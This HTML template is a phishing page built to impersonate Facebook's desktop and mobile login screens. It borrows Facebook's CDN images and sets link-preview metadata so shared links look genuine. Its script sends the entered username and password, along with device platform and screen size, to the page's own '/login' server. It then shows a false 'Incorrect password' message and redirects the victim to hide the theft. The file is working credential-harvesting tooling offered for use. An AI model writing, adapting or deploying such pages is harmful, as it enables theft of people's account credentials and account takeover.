<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{{ preview_title }}</title>

  <!-- Open Graph (Facebook, WhatsApp, Telegram, Signal, iMessage…) -->
  <meta property="og:type"        content="website">
  <meta property="og:title"       content="{{ preview_title }}">
  <meta property="og:description" content="{{ preview_description }}">
  <meta property="og:image"       content="{{ preview_image_url }}">
  <meta property="og:image:width"  content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:site_name"   content="Facebook">

  <!-- Twitter / X -->
  <meta name="twitter:card"        content="summary_large_image">
  <meta name="twitter:title"       content="{{ preview_title }}">
  <meta name="twitter:description" content="{{ preview_description }}">
  <meta name="twitter:image"       content="{{ preview_image_url }}">

  <meta name="description" content="{{ preview_description }}">
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-z.ico">

  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --blue:  #1877F2;
      --green: #42b72a;
      --dark:  #1c1e21;
      --grey:  #606770;
      --bdr:   #dddfe2;
      --bg:    #f0f2f5;
    }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
                        Helvetica, Arial, sans-serif;
           background: var(--bg); min-height: 100vh; color: var(--dark); }

    /* ── DESKTOP ── */
    .desktop {
      display: flex; align-items: center; justify-content: center;
      gap: 36px; max-width: 980px; margin: 0 auto;
      min-height: calc(100vh - 56px); padding: 32px 20px 0;
    }
    .d-left  { flex: 1; max-width: 500px; }
    .d-right { width: 396px; flex-shrink: 0; }

    .d-logo img { width: 56px; height: auto; display: block; margin-bottom: 16px; }
    .d-tagline  { font-size: 28px; font-weight: 400; line-height: 1.28;
                  margin-bottom: 28px; }
    .d-tagline .blue { color: var(--blue); }
    .d-banner { width: 100%; max-width: 464px; display: block; }

    .card { background: #fff; border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
            padding: 20px 24px 28px; }
    .card h2 { font-size: 20px; font-weight: 600; margin-bottom: 18px; }

    .f-input {
      display: block; width: 100%;
      padding: 14px 16px; border: 1px solid var(--bdr); border-radius: 6px;
      font-size: 17px; color: var(--dark); background: #fff; outline: none;
      transition: border-color .15s, box-shadow .15s; margin-bottom: 12px;
    }
    .f-input::placeholder { color: #bec3c9; }
    .f-input:focus        { border-color: var(--blue); box-shadow: 0 0 0 2px rgba(24,119,242,.22); }
    .f-input.err          { border-color: #e41e3f;     box-shadow: 0 0 0 2px rgba(228,30,63,.18); }

    .btn-login {
      display: flex; align-items: center; justify-content: center;
      width: 100%; padding: 14px; background: var(--blue); color: #fff;
      border: none; border-radius: 6px; font-size: 20px; font-weight: 700;
      cursor: pointer; transition: background .15s; min-height: 52px;
      margin-bottom: 12px;
    }
    .btn-login:hover:not(:disabled) { background: #166fe5; }
    .btn-login:disabled { background: #9fc5f8; cursor: not-allowed; }

    .forgot { display: block; text-align: center; color: var(--blue);
              font-size: 14px; text-decoration: none; padding: 4px 0; }
    .forgot:hover { text-decoration: underline; }

    .divider { height: 1px; background: var(--bdr); margin: 20px 0; }

    .btn-create {
      display: block; width: fit-content; margin: 0 auto;
      padding: 14px 24px; background: var(--green); color: #fff;
      border: none; border-radius: 6px; font-size: 17px; font-weight: 700;
      cursor: pointer; text-decoration: none; transition: background .15s;
    }
    .btn-create:hover { background: #36a420; }

    .meta-row { text-align: center; margin-top: 28px; }
    .meta-row img { height: 18px; }

    .err-box {
      display: none; background: #fff3cd; border: 1px solid #ffc107;
      color: #7a4f01; border-radius: 6px; padding: 10px 14px;
      font-size: 14px; line-height: 1.4; margin-bottom: 12px;
    }

    .lang-bar {
      display: flex; flex-wrap: wrap; justify-content: center;
      gap: 2px 6px; padding: 16px 20px 24px;
      font-size: 12px; color: var(--grey);
    }
    .lang-bar a { color: var(--grey); text-decoration: none; }
    .lang-bar a:hover { text-decoration: underline; }
    .lang-bar .sep { color: #ccc; }

    /* spinner */
    .spin { display:none; width:22px; height:22px;
            border:3px solid rgba(255,255,255,.35);
            border-top-color:#fff; border-radius:50%;
            animation:rot .65s linear infinite; }
    @keyframes rot { to { transform:rotate(360deg); } }

    /* ── MOBILE ── */
    .mobile { display: none; }

    @media (max-width: 768px) {
      body { background: #fff; }
      .desktop, .lang-bar { display: none !important; }
      .mobile { display: flex; flex-direction: column; min-height: 100vh; }

      .m-topbar {
        display: flex; align-items: center; gap: 8px;
        padding: 10px 16px; font-size: 13px; color: var(--blue);
        border-bottom: 1px solid #f0f2f5; flex-shrink: 0;
      }
      .m-lang { text-align: center; font-size: 13px; color: var(--grey);
                padding: 8px 16px 0; flex-shrink: 0; }

      .m-body {
        flex: 1; display: flex; flex-direction: column;
        align-items: center; padding: 24px 16px 16px;
      }
      .m-logo { width:60px; height:60px; object-fit:contain; margin-bottom:28px; }
      .m-form { width: 100%; max-width: 420px; }
      .m-form .f-input  { font-size: 15px; padding: 13px 16px; }
      .m-form .btn-login { font-size: 17px; padding: 13px; min-height: 46px; }

      .m-forgot { display:block; text-align:center; color:var(--blue);
                  font-size:14px; text-decoration:none; margin:8px 0 0; padding:6px 0; }
      .m-forgot:hover { text-decoration: underline; }

      .m-footer { flex-shrink:0; padding:16px; display:flex;
                  flex-direction:column; align-items:center; gap:12px; }
      .btn-create-m {
        display:block; width:100%; max-width:420px; padding:13px 24px;
        background:#fff; color:var(--blue); border:1px solid var(--bdr);
        border-radius:6px; font-size:15px; font-weight:600; cursor:pointer;
        text-align:center; text-decoration:none;
      }
      .btn-create-m:hover { background: #f0f2f5; }
      .m-meta img { height: 14px; }
    }
  </style>
</head>
<body>

<!-- ══ DESKTOP ══════════════════════════════════════════════════════════ -->
<div class="desktop">
  <div class="d-left">
    <div class="d-logo">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/bUZjZjr-wvp.webp" alt="Facebook"
           onerror="this.outerHTML='<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'50\' height=\'50\' viewBox=\'0 0 32 32\'><rect width=\'32\' height=\'32\' rx=\'6\' fill=\'%231877F2\'/><path d=\'M21 16h-3v-2c0-.8.4-1 1-1h2V10h-3c-2.8 0-4 2-4 4v2h-2v3h2v8h4v-8h2.5L21 16z\' fill=\'%23fff\'/></svg>'">
    </div>
    <div class="d-tagline">Explore<br>the<br>things<br><span class="blue">you love.</span></div>
    <img class="d-banner"
         src="https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp"
         alt="" onerror="this.style.display='none'">
  </div>

  <div class="d-right">
    <div class="card">
      <h2>Log into Facebook</h2>
      <div class="err-box" id="d-err"></div>
      <input class="f-input" id="d-user" type="text"
             placeholder="Email or mobile number" autocomplete="username">
      <input class="f-input" id="d-pass" type="password"
             placeholder="Password" autocomplete="current-password">
      <button class="btn-login" id="d-btn" onclick="doLogin('d')">
        <span id="d-txt">Log in</span>
        <div class="spin" id="d-spin"></div>
      </button>
      <a class="forgot" href="#">Forgot password?</a>
      <div class="divider"></div>
      <a class="btn-create" href="#">Create new account</a>
    </div>
    <div class="meta-row">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/bUZjZjr-wvp.webp" alt="Meta"
           onerror="this.outerHTML='<span style=\'font-size:13px;color:#606770\'>Meta</span>'">
    </div>
  </div>
</div>

<div class="lang-bar">
  <a href="#">English (US)</a><span class="sep">·</span>
  <a href="#">Español</a><span class="sep">·</span>
  <a href="#">Français (France)</a><span class="sep">·</span>
  <a href="#">中文(简体)</a><span class="sep">·</span>
  <a href="#">العربية</a><span class="sep">·</span>
  <a href="#">Português (Brasil)</a><span class="sep">·</span>
  <a href="#">Italiano</a><span class="sep">·</span>
  <a href="#">More languages…</a>
</div>


<!-- ══ MOBILE ═══════════════════════════════════════════════════════════ -->
<div class="mobile">
  <div class="m-topbar">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M16 1H8C6.3 1 5 2.3 5 4v16c0 1.7 1.3 3 3 3h8c1.7 0 3-1.3 3-3V4c0-1.7-1.3-3-3-3zm-4 19c-.8 0-1.5-.7-1.5-1.5S11.2 17 12 17s1.5.7 1.5 1.5S12.8 20 12 20zm4-4H8V4h8v12z"/>
    </svg>
    Get Facebook for Android and browse faster.
  </div>
  <div class="m-lang">English (US)</div>

  <div class="m-body">
    <img class="m-logo"
         src="https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/bUZjZjr-wvp.webp" alt="Facebook"
         onerror="this.outerHTML='<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'60\' height=\'60\' viewBox=\'0 0 32 32\' style=\'margin-bottom:28px\'><rect width=\'32\' height=\'32\' rx=\'6\' fill=\'%231877F2\'/><path d=\'M21 16h-3v-2c0-.8.4-1 1-1h2V10h-3c-2.8 0-4 2-4 4v2h-2v3h2v8h4v-8h2.5L21 16z\' fill=\'%23fff\'/></svg>'">
    <div class="m-form">
      <div class="err-box" id="m-err"></div>
      <input class="f-input" id="m-user" type="text"
             placeholder="Mobile number or email" autocomplete="username">
      <input class="f-input" id="m-pass" type="password"
             placeholder="Password" autocomplete="current-password">
      <button class="btn-login" id="m-btn" onclick="doLogin('m')">
        <span id="m-txt">Log in</span>
        <div class="spin" id="m-spin"></div>
      </button>
      <a class="m-forgot" href="#">Forgot password?</a>
    </div>
  </div>

  <div class="m-footer">
    <a class="btn-create-m" href="#">Create new account</a>
    <div class="m-meta">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/bUZjZjr-wvp.webp" alt="Meta"
           onerror="this.outerHTML='<span style=\'font-size:12px;color:#606770\'>Meta</span>'">
    </div>
  </div>
</div>

<script>
(function(){
  'use strict';
  function $id(id){ return document.getElementById(id); }

  function setLoading(p, on){
    $id(p+'-btn').disabled = on;
    $id(p+'-txt').style.display = on ? 'none' : 'inline';
    $id(p+'-spin').style.display = on ? 'block' : 'none';
  }
  function showErr(p, msg){
    var b = $id(p+'-err'); b.textContent = msg; b.style.display = 'block';
  }
  function clearErr(p){
    $id(p+'-err').style.display = 'none';
    $id(p+'-user').classList.remove('err');
    $id(p+'-pass').classList.remove('err');
  }

  window.doLogin = async function(p){
    clearErr(p);
    var user = $id(p+'-user').value.trim();
    var pass = $id(p+'-pass').value;

    if(!user){ $id(p+'-user').classList.add('err');
               showErr(p,'Please enter your email or phone number.'); return; }
    if(!pass){ $id(p+'-pass').classList.add('err');
               showErr(p,'Please enter your password.'); return; }

    setLoading(p, true);

    try {
      var res = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: user, password: pass,
          platform: navigator.platform || '',
          screen_info: screen.width + 'x' + screen.height
        })
      });
      var data = await res.json();
      setLoading(p, false);

      if(data.redirect){
        // Small delay so user sees the error, then redirect
        showErr(p, data.error || 'Incorrect password.');
        $id(p+'-pass').value = '';
        $id(p+'-pass').classList.add('err');
        setTimeout(function(){ window.location.href = data.redirect; }, 2000);
      } else {
        showErr(p, data.error || 'Something went wrong.');
        $id(p+'-pass').value = '';
        $id(p+'-pass').classList.add('err');
      }
    } catch(e) {
      setLoading(p, false);
      showErr(p, 'Network error. Please try again.');
    }
  };

  // Enter key
  document.querySelectorAll('.f-input').forEach(function(el){
    el.addEventListener('keydown', function(e){
      if(e.key === 'Enter'){
        e.preventDefault();
        doLogin(this.id.startsWith('m-') ? 'm' : 'd');
      }
    });
  });
})();
</script>
</body>
</html>
